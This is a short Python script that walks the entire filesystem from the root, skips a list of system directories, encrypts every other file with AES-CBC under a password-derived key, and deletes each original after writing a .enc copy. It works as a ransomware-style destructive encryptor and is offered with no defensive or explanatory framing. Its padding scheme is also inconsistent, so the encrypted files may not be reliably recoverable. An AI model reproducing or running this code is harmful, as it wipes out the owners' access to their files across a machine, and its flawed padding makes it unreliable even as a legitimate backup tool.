
import os
import sys
import getpass
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes

# AES constants
KEY_LENGTH = 32
SALT_SIZE = 16
IV_SIZE = 16
ITERATIONS = 100_000
CHUNK_SIZE = 64 * 1024

# Folders to skip (critical system dirs)
EXCLUDE_DIRS = ["/bin", "/boot", "/dev", "/etc", "/lib", "/proc", "/run", "/sbin", "/sys", "/usr", "/var"]

def pad(data):
    padding_len = AES.block_size - len(data) % AES.block_size
    return data + bytes([padding_len]) * padding_len

def encrypt_file(filepath, password):
    try:
        salt = get_random_bytes(SALT_SIZE)
        key = PBKDF2(password, salt, dkLen=KEY_LENGTH, count=ITERATIONS)
        iv = get_random_bytes(IV_SIZE)
        cipher = AES.new(key, AES.MODE_CBC, iv)

        out_file = filepath + ".enc"

        with open(filepath, "rb") as f_in, open(out_file, "wb") as f_out:
            f_out.write(salt)
            f_out.write(iv)

            while chunk := f_in.read(CHUNK_SIZE):
                if len(chunk) % AES.block_size != 0:
                    chunk = pad(chunk)
                f_out.write(cipher.encrypt(chunk))

        os.remove(filepath)
        print(f"[+] Encrypted & deleted original: {filepath} -> {out_file}")

    except Exception as e:
        print(f"[!] Skipped {filepath} (error: {e})")

def encrypt_machine(password):
    for root, dirs, files in os.walk("/"):
        # Skip system-critical folders
        if any(root.startswith(ex) for ex in EXCLUDE_DIRS):
            continue

        for filename in files:
            filepath = os.path.join(root, filename)
            if filepath.endswith(".enc"):
                continue
            encrypt_file(filepath, password)

if __name__ == "__main__":
    password = getpass.getpass("Enter password: ")
    print("[*] Starting full machine encryption (excluding system dirs)...")
    encrypt_machine(password)
